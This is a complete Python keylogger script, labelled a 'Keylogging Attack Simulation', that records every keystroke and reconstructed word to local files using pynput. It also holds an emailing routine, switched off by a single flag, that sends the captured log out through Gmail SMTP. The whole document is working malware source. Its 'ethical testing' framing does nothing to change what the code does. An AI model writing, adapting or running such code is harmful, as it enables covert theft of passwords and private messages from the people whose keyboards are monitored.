# -------------------- IMPORT REQUIRED LIBRARIES -------------------- #

from pynput import keyboard
from datetime import datetime
import logging
import smtplib
import ssl

# -------------------- CONFIGURATION -------------------- #

KEYLOG_FILE = "keylogs.txt"
WORDLOG_FILE = "wordlogs.txt"
SYSTEM_LOG = "system.log"

ENABLE_EMAIL_TRANSFER = False  # Keep FALSE unless explicitly required

SENDER_EMAIL = "user@domain.com"
RECEIVER_EMAIL = "user@domain.com"
EMAIL_PASSWORD = "passcode"
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

# -------------------- LOGGING SETUP -------------------- #

logging.basicConfig(
    filename=SYSTEM_LOG,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

logging.info("Keylogging simulation initialized.")

# -------------------- GLOBAL VARIABLES -------------------- #

current_word = ""
start_time = datetime.now()
key_count = 0
word_count = 0

# -------------------- FILE WRITE FUNCTIONS -------------------- #

def write_keylog(text):
    with open(KEYLOG_FILE, "a") as f:
        f.write(text)

def write_wordlog(word):
    global word_count
    if word.strip() != "":
        with open(WORDLOG_FILE, "a") as f:
            f.write(word + "\n")
        word_count += 1

# -------------------- KEY PRESS HANDLER -------------------- #

def on_key_press(key):
    global current_word, key_count

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    key_count += 1

    try:
        # Character key
        write_keylog(f"[{timestamp}] Character Key: {key.char}\n")
        current_word += key.char

    except AttributeError:
        # Special keys
        write_keylog(f"[{timestamp}] Special Key: {key}\n")

        if key == keyboard.Key.space or key == keyboard.Key.enter:
            write_wordlog(current_word)
            current_word = ""

        elif key == keyboard.Key.backspace:
            current_word = current_word[:-1]

    logging.info(f"Captured key: {key}")

# -------------------- KEY RELEASE HANDLER -------------------- #

def on_key_release(key):
    if key == keyboard.Key.esc:
        end_time = datetime.now()
        duration = end_time - start_time

        # Save last word if any
        write_wordlog(current_word)

        # Write summary
        with open("summary.txt", "w") as f:
            f.write("Keylogging Simulation Summary\n")
            f.write(f"Start Time: {start_time}\n")
            f.write(f"End Time: {end_time}\n")
            f.write(f"Duration: {duration}\n")
            f.write(f"Total Keys Captured: {key_count}\n")
            f.write(f"Total Words Captured: {word_count}\n")

        logging.info("Simulation terminated by ESC key.")
        print("Keylogging simulation stopped.")
        return False

# -------------------- START KEYBOARD LISTENER -------------------- #

print("Keylogging Attack Simulation Started")
print("Press ESC to stop logging")

with keyboard.Listener(
    on_press=on_key_press,
    on_release=on_key_release
) as listener:
    listener.join()

# -------------------- OPTIONAL SECURE EMAIL TRANSFER -------------------- #

if ENABLE_EMAIL_TRANSFER:
    try:
        context = ssl.create_default_context()
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls(context=context)
        server.login(SENDER_EMAIL, EMAIL_PASSWORD)

        with open(KEYLOG_FILE, "r") as f:
            data = f.read()

        message = f"""Subject: Keylogging Simulation Data

{data}
"""

        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, message)
        server.quit()

        logging.info("Keylog data transmitted securely via SMTP.")

    except Exception as e:
        logging.error(f"Email transfer failed: {e}")

else:
    logging.info("Email transfer disabled for ethical testing.")

print("Program execution completed.")
